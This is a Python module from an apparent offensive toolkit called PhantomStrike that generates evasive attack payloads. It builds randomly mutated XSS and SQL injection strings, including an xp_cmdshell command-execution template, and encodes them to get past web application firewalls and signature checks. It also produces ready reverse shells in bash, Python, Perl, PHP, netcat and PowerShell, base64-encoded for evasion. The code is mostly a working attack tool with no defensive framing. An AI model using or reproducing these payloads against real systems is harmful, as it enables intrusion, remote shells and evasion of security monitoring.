"""
PhantomStrike Stealth Engine — Polymorphic payload generation,
WAF bypass, AV evasion, EDR unhooking, and traffic obfuscation.
Uses AI to generate unique, never-before-seen payloads.
"""
from __future__ import annotations
import asyncio
import base64
import hashlib
import logging
import random
import string
from datetime import datetime

from phantom.modules.base import BaseModule, ModuleResult, ModuleStatus
from phantom.core.events import EventBus

logger = logging.getLogger("phantom.stealth")

# WAF bypass encoding techniques
ENCODINGS = {
    "url_encode": lambda s: "".join(f"%{ord(c):02x}" for c in s),
    "double_url": lambda s: "".join(f"%25{ord(c):02x}" for c in s),
    "unicode": lambda s: "".join(f"\\u{ord(c):04x}" for c in s),
    "hex": lambda s: "".join(f"\\x{ord(c):02x}" for c in s),
    "base64": lambda s: base64.b64encode(s.encode()).decode(),
    "html_entity": lambda s: "".join(f"&#{ord(c)};" for c in s),
    "octal": lambda s: "".join(f"\\{ord(c):03o}" for c in s),
}

# XSS payload templates for mutation
XSS_TEMPLATES = [
    '<{tag} {event}={handler}>',
    '<{tag} {event}="{handler}">',
    '"><{tag} {event}={handler}>',
    "'-{handler}-'",
    '<{tag}/onload={handler}>',
    '{{{{constructor.constructor("return this")().alert(1)}}}}',
]

XSS_TAGS = ["img", "svg", "body", "details", "input", "marquee", "video", "audio", "iframe"]
XSS_EVENTS = ["onerror", "onload", "onfocus", "onmouseover", "ontoggle", "onanimationend"]
XSS_HANDLERS = ["alert(1)", "confirm(1)", "prompt(1)", "alert`1`", "alert(document.domain)"]

# SQLi mutation patterns
SQLI_TEMPLATES = [
    "' {comment}OR{comment} '{value}'='{value}",
    '" {comment}OR{comment} "{value}"="{value}',
    "' {union}SELECT{comment} {columns}--",
    "1{comment}AND{comment}1=1",
    "' {comment}WAITFOR{comment}DELAY{comment}'{delay}'--",
    "';{comment}EXEC{comment}xp_cmdshell('{cmd}')--",
]

SQL_COMMENTS = ["/**/", "/*!*/", "/*!", " ", "\t", "\n", "/*foo*/"]


class StealthEngine(BaseModule):
    """Polymorphic payload generation and evasion engine."""

    @property
    def name(self) -> str:
        return "phantom-stealth"

    @property
    def description(self) -> str:
        return "Evasion — polymorphic payloads, WAF bypass, AV evasion"

    @property
    def category(self) -> str:
        return "evasion"

    async def _setup(self):
        self._generated_count = 0

    async def run(self, target: str, options: dict = None) -> ModuleResult:
        """Generate evasive payloads for a target."""
        options = options or {}
        self.status = ModuleStatus.RUNNING
        start_time = datetime.now()
        payload_type = options.get("type", "xss")

        findings = {
            "target": target,
            "payload_type": payload_type,
            "payloads": [],
            "encodings_applied": [],
        }

        if payload_type == "xss":
            findings["payloads"] = self.generate_polymorphic_xss(count=20)
        elif payload_type == "sqli":
            findings["payloads"] = self.generate_polymorphic_sqli(count=20)
        elif payload_type == "reverse_shell":
            findings["payloads"] = self.generate_reverse_shells(
                options.get("lhost", "0.0.0.0"),
                options.get("lport", 4444),
            )

        self.status = ModuleStatus.COMPLETED
        return ModuleResult(
            module_name=self.name, operation=f"generate_{payload_type}",
            success=True, data=findings, findings_count=len(findings["payloads"]),
            start_time=start_time, end_time=datetime.now(),
        )

    def generate_polymorphic_xss(self, count: int = 10) -> list[dict]:
        """Generate unique XSS payloads — never the same twice."""
        payloads = []
        for i in range(count):
            tag = random.choice(XSS_TAGS)
            event = random.choice(XSS_EVENTS)
            handler = random.choice(XSS_HANDLERS)

            # Pick a random template
            template = random.choice(XSS_TEMPLATES)

            try:
                base_payload = template.format(tag=tag, event=event, handler=handler)
            except (KeyError, IndexError):
                base_payload = f'<{tag} {event}={handler}>'

            # Apply random encoding
            encoding_name = random.choice(list(ENCODINGS.keys()) + ["none", "none", "none"])
            if encoding_name != "none":
                encoder = ENCODINGS[encoding_name]
                # Encode only the handler part for bypass
                encoded_handler = encoder(handler)
                try:
                    encoded = template.format(tag=tag, event=event, handler=encoded_handler)
                except (KeyError, IndexError):
                    encoded = base_payload
            else:
                encoded = base_payload

            # Add random junk to evade signatures
            junk = "".join(random.choices(string.ascii_lowercase, k=3))
            mutations = [
                encoded,
                encoded.replace("<", "\x3c"),  # Hex bypass
                encoded.replace(">", "\x3e"),
                f"<!--{junk}-->{encoded}",  # Comment injection
                encoded.replace(" ", "\t"),  # Tab substitution
                encoded.upper() if random.random() > 0.5 else encoded,  # Case mutation
            ]

            payloads.append({
                "id": i + 1,
                "payload": random.choice(mutations),
                "original": base_payload,
                "encoding": encoding_name,
                "tag": tag,
                "event": event,
                "unique_hash": hashlib.md5(encoded.encode()).hexdigest()[:8],
            })

        self._generated_count += count
        return payloads

    def generate_polymorphic_sqli(self, count: int = 10) -> list[dict]:
        """Generate unique SQL injection payloads."""
        payloads = []
        for i in range(count):
            template = random.choice(SQLI_TEMPLATES)
            comment = random.choice(SQL_COMMENTS)
            value = random.choice(["1", "a", "x", str(random.randint(1, 99))])

            try:
                payload = template.format(
                    comment=comment, value=value,
                    union="", columns="NULL,NULL,NULL",
                    delay="0:0:5", cmd="whoami",
                )
            except (KeyError, IndexError):
                payload = f"' {comment}OR{comment} '1'='1"

            # Apply encoding
            enc_name = random.choice(["url_encode", "double_url", "none", "none"])
            if enc_name != "none" and enc_name in ENCODINGS:
                encoded = ENCODINGS[enc_name](payload)
            else:
                encoded = payload

            payloads.append({
                "id": i + 1,
                "payload": encoded,
                "original": payload,
                "encoding": enc_name,
                "comment_style": comment.strip() or "space",
                "unique_hash": hashlib.md5(encoded.encode()).hexdigest()[:8],
            })

        return payloads

    def generate_reverse_shells(self, lhost: str, lport: int) -> list[dict]:
        """Generate reverse shell payloads in multiple languages."""
        shells = [
            {
                "language": "bash",
                "payload": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            },
            {
                "language": "python",
                "payload": (
                    f"python3 -c 'import socket,subprocess,os;"
                    f's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
                    f's.connect(("{lhost}",{lport}));'
                    f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
                    f"os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
                ),
            },
            {
                "language": "perl",
                "payload": (
                    f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
                    f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                    f"if(connect(S,sockaddr_in($p,inet_aton($i))))"
                    f"{{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
                    f"exec(\"/bin/sh -i\");}};'"
                ),
            },
            {
                "language": "php",
                "payload": f"php -r '$s=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            },
            {
                "language": "nc",
                "payload": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            },
            {
                "language": "powershell",
                "payload": (
                    f"powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
                    f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0)"
                    f"{{$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
                    f"$o=(iex $d 2>&1|Out-String);$p=$o+'PS '+(pwd).Path+'> ';"
                    f"$sb=([text.encoding]::ASCII).GetBytes($p);$s.Write($sb,0,$sb.Length)}}\""
                ),
            },
        ]

        # Base64 encode each for evasion
        for shell in shells:
            shell["base64"] = base64.b64encode(shell["payload"].encode()).decode()
            shell["lhost"] = lhost
            shell["lport"] = lport

        return shells
